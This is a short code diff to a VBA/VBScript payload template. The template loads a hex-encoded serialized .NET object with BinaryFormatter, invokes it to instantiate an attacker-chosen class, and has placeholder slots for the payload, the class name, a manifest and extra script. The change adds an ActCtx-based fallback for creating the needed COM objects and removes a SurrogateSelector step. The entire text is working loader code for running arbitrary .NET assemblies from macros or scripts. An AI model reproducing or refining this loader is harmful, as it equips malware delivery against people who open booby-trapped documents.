@@ -11,20 +11,30 @@ End Function
 Function Run()
     On Error Resume Next
 
-    SetVersion
-
-    Dim serialized_obj
+    Dim s As String
     %SERIALIZED%
 
     entry_class = "%CLASS%"
 
     Dim stm As Object, fmt As Object, al As Object
     Set stm = CreateObject("System.IO.MemoryStream")
-    Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
-    Set al = CreateObject("System.Collections.ArrayList")
+
+    If stm Is Nothing Then
+        %MANIFEST%
+
+        Set ax = CreateObject("Microsoft.Windows.ActCtx")
+		ax.ManifestText = manifest
+		
+        Set stm = ax.CreateObject("System.IO.MemoryStream")
+        Set fmt = ax.CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
+        Set al = ax.CreateObject("System.Collections.ArrayList")
+    Else
+        Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
+        Set al = CreateObject("System.Collections.ArrayList")
+    End If
 
     Dim dec
-    dec = decodeHex(serialized_obj)
+    dec = decodeHex(s)
 
     For Each i In dec
         stm.WriteByte i
@@ -33,9 +43,8 @@ Function Run()
     stm.Position = 0
 
     Dim n As Object, d As Object, o As Object
-    Set n = fmt.SurrogateSelector
     Set d = fmt.Deserialize_2(stm)
-    al.Add n
+    al.Add Empty
 
     Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
     %ADDEDSCRIPT%
